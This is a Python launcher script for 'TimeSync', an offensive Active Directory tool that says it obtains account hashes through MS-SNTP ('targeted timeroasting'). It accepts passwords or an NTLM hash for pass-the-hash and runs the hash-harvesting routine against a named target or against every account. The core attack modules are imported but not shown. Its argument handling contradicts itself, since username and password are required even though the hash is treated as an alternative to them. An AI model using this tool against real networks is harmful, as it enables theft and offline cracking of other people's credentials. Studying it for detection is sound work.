#!/usr/bin/env python3

import argparse
import sys
from timesync.authenticator import ADAuthenticator
from timesync.TargetedTimeroast import TargetedTimeroast

def parse_args():
    parser = argparse.ArgumentParser(description='TimeSync - a tool to obtain hash using MS-SNTP for user accounts')
    
    # Authentication parameters
    auth_group = parser.add_argument_group('Authentication')
    auth_group.add_argument('-u', '--username', required=True, help='Username')
    auth_group.add_argument('-p', '--password', required=True, help='Password')
    auth_group.add_argument('-d', '--domain', required=True, help='Domain')
    auth_group.add_argument('-H', '--hash', help='NTLM hash for Pass-the-Hash')
    auth_group.add_argument('-t', '--target', help='Target user or group')
    auth_group.add_argument('--dc-ip', help='IP address of the domain controller to avoid DNS resolution issues')
    
    # Output parameters
    output_group = parser.add_argument_group('Output')
    output_group.add_argument('-v', '--verbose', action='store_true',
                            help='Verbose output')
    
    # If no arguments are provided, show help and exit
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    
    # Check for required authentication parameters
    if not args.hash and not (args.username and args.password):
        parser.error("Either NTLM hash (-H) or username and password (-u and -p) must be provided")
    
    return args

def main():
    args = parse_args()
    # Initialize authenticator
    auth = ADAuthenticator(
        username=args.username,
        password=args.password,
        domain=args.domain,
        dc_host=args.dc_ip,
        ntlm_hash=args.hash
    )
    
    # Connect to AD
    if not auth.connect():
        print("[!] Error connecting to Active Directory")
        sys.exit(1)
        
    print("[+] Successfully connected to Active Directory")

    # Execute TargetedTimeroast
    if args.target:
        TargetedTimeroast(auth.conn, args.target, args.verbose)
    else:
        TargetedTimeroast(auth.conn, verbose=args.verbose)

if __name__ == '__main__':
    main() 